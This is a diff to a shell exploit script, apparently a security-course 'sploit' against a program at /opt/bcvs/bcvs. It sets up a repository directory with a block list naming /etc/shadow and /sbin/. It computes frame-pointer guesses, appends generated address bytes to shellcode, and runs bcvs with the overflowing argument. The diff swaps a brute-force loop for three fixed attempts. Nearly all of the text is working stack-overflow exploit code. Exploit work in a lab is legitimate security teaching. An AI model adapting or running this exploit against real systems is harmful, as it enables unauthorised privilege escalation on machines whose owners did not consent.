@@ -6,8 +6,23 @@
 ## main. This overflow needs to be carefully crated to not cause
 ## problems with other function calls like copyFile.
 ##
-## See sploit4.txt for more information.
 ## --------------------------------------------------------------- ##
+
+REPODIR=".bcvs"
+BLOCKLIST="block.list"
+BLOCKLISTPATH="${REPODIR}/${BLOCKLIST}"
+
+rm -rf sploit4_dir
+mkdir sploit4_dir
+cd sploit4_dir
+mkdir .bcvs
+touch .bcvs/block.list
+
+#blocklist - Exact copy of the one in bcvs's directory
+echo $REPODIR > $BLOCKLISTPATH
+echo "/etc/" >> $BLOCKLISTPATH
+echo "/etc/shadow" >> $BLOCKLISTPATH
+echo "/sbin/" >> $BLOCKLISTPATH
 
 ## The following section hold the text for any supporting programs or
 ## scripts for this sploit.
@@ -34,6 +49,8 @@ chmod +x test_gen_argv.sh
 
 cat <<EOS > "rerun_sploit.sh"
 #!/bin/bash
+# This is for convenience. You need to run this using the source
+# operator ". rerun_sploit.sh" or "source rerun_sploit.sh"
 cd ..
 ./sploit.sh
 cd sploit4_dir
@@ -245,28 +262,24 @@ echo "Shellcode length: ${#SHELLCODE}"
 # brute force.
 echo "Finding best guess for the frame pointer"
 FRAME_PTR=$(./find_frame_ptr.py)
+FRAME_PTR2=$(./find_frame_ptr.py 16)
+FRAME_PTR3=$(./find_frame_ptr.py -16)
+echo "FRAME_PTR1: $FRAME_PTR"
+echo "FRAME_PTR2: $FRAME_PTR2"
+echo "FRAME_PTR3: $FRAME_PTR3"
+SC_ADDITION=$(./gen_argv $FRAME_PTR)
+SC_ADDITION2=$(./gen_argv $FRAME_PTR2)
+SC_ADDITION3=$(./gen_argv $FRAME_PTR3)
+if [[ $? != "0" ]]; then
+  echo "Failed to generate shellcode addition"
+  exit -1;
+fi
+echo "Shellcode addition: $SC_ADDITION"
+echo "Length of shellcode addition: ${#SC_ADDITION}"
 
-OFFSET_ATTEMPTS=10
-ITER=0
+echo "Shellcode being passed to bcvs: ${SHELLCODE}${SC_ADDITION}"
 
-echo "Frame pointer guess: $FRAME_PTR"
-echo "Now trying iterations out from the guess (in 16 byte increments either way)"
-while [[ $ITER -le $OFFSET_ATTEMPTS ]]; do
-  OFFSET1=$(( 16 * ITER ));
-  OFFSET2=$(( -16 * ITER ));
-  echo "Offset1: ${OFFSET1}, Offset2: ${OFFSET2}"
-  F_PTR1=$(( FRAME_PTR + OFFSET1 ))
-  F_PTR2=$(( FRAME_PTR + OFFSET2 ))
-
-  SC_ADD1=$(./gen_argv $F_PTR1)
-  SC_ADD2=$(./gen_argv $F_PTR2)
-
-  echo "Trying frame pointer: `printf '%8x' $F_PTR1`"
-  /opt/bcvs/bcvs co "${SHELLCODE}${SC_ADD1}"
-  if [[ $OFFSET1 -ne $OFFSET2 ]]; then
-    echo "Trying frame pointer: `printf '%8x' $F_PTR2`"
-    /opt/bcvs/bcvs co "${SHELLCODE}${SC_ADD2}"
-  fi
-
-  ITER=$(( ITER + 1 ))
-done
+/opt/bcvs/bcvs co "${SHELLCODE}${SC_ADDITION}"
+/opt/bcvs/bcvs co "${SHELLCODE}${SC_ADDITION2}"
+/opt/bcvs/bcvs co "${SHELLCODE}${SC_ADDITION3}"
+#gdb --args /opt/bcvs/bcvs co "${SHELLCODE}${SC_ADDITION}" < run_gdb
